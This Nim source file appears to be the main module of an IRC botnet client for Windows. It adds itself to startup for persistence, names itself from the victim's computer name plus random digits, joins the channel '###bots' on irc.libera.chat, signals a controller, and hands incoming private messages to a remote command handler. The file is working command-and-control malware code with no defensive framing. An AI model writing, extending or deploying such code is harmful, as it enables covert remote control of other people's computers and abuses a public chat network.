import irc, asyncdispatch, winim, random, strutils, threadpool

import command_handler, update_handler

# Check for updates
discard updt_check(false, nil, IrcEvent())
updt_createStartupShortcut()

var
    name_buffer: array[0..15, WCHAR]
    name_size : DWORD
    name : string
name_size = 15*sizeof(WCHAR)

## Nickname is based on computer name
if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
    raise newException(OSError, "Failed to retrieve computer name")

## The computer name needs to become a proper string as opposed to a raw buffer
for i in 0..<len(name_buffer):
    if name_buffer[i] != 0:
        name &= cast[char](name_buffer[i])
    else:
        break

if g_dbg: echo "ComputerName: ", name

## The final nickname must be 16 chars long so the rest will be filled with random digits
randomize()
var 
  randInt1 = rand(1000000..9999999)
  randInt2 = rand(1000000..9999999)
  target_channel:string = "###bots"


if g_dbg: echo "Trying to connect"

if g_dbg: echo "Connected"

proc onIrcEvent(client: AsyncIrc, event: IrcEvent) {.async.} =
  case event.typ
  of EvConnected:
    discard
  of EvDisconnected, EvTimeout:
    #break
    await client.reconnect()
  of EvMsg:
    if event.cmd == MPrivMsg:
      if event.origin != target_channel:
        spawn cmdh_handle(event, client)
    if event.raw.contains(":End of /NAMES list."):
      ## Notify the controller that the bot has joined
      discard client.privmsg(target_channel,".")
    
    if g_dbg: echo(event.raw)

var  client = newAsyncIrc("irc.libera.chat", nick=name & $randInt1 & $randInt2, joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)

asyncCheck client.run()

runForever()